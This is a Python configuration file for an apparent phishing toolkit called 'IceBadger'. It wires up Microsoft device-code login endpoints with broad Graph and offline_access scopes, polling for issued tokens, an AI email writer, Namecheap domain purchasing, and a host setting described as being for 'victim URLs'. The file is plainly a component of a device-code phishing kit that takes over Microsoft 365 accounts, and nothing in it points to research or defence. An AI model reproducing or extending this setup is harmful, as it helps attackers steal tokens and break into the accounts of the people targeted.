# ── config.py ──────────────────────────────────────────────
import os
from pathlib import Path
from dotenv import load_dotenv

BASE_DIR = Path(__file__).parent.resolve()
ENV_PATH = BASE_DIR / '.env'
load_dotenv(dotenv_path=ENV_PATH)

class Config:
    BASE_DIR = BASE_DIR
    _raw_db = os.getenv("ICEBADGER_DB_PATH", "icebadger.db")
    DB_PATH = str((BASE_DIR / _raw_db).resolve()) if not os.path.isabs(_raw_db) else _raw_db
    
    # Microsoft Entra ID Specifics
    CLIENT_ID = os.getenv("ICEBADGER_CLIENT_ID")
    TENANT_ID = os.getenv("ICEBADGER_TENANT_ID", "common")
    SCOPE = os.getenv("ICEBADGER_SCOPES", "https://graph.microsoft.com/.default openid profile offline_access")
    
    DEVICE_CODE_URL = os.getenv("ICEBADGER_DEVICE_CODE_URL", f"https://login.microsoftonline.com/{TENANT_ID}/oauth2/v2.0/devicecode")
    TOKEN_URL = os.getenv("ICEBADGER_TOKEN_URL", f"https://login.microsoftonline.com/{TENANT_ID}/oauth2/v2.0/token")
    
    # Polling
    POLL_INTERVAL = int(os.getenv("ICEBADGER_POLL_INTERVAL", 5))
    MAX_RETRIES = int(os.getenv("ICEBADGER_MAX_RETRIES", 3))
    RETRY_DELAY = float(os.getenv("ICEBADGER_RETRY_DELAY", 5.0))
    
    # Web Dashboard
    WEB_HOST = os.getenv("ICEBADGER_WEB_HOST", "0.0.0.0")
    WEB_PORT = int(os.getenv("ICEBADGER_WEB_PORT", 5000))

    # AI Email Writer
    GEMINI_API_KEY = os.getenv("GEMINI_API_KEY", "")

    # Namecheap API (for domain search & purchase)
    NAMECHEAP_API_KEY  = os.getenv("NAMECHEAP_API_KEY", "")
    NAMECHEAP_API_USER = os.getenv("NAMECHEAP_API_USER", "")
    NAMECHEAP_CLIENT_IP = os.getenv("NAMECHEAP_CLIENT_IP", "")

    # Public-facing host used when building victim URLs (e.g. https://yourserver.com)
    DEPLOY_HOST = os.getenv("ICEBADGER_DEPLOY_HOST", "http://127.0.0.1:5000")

    if not CLIENT_ID:
        raise ValueError("ICEBADGER_CLIENT_ID must be set in environment or .env file")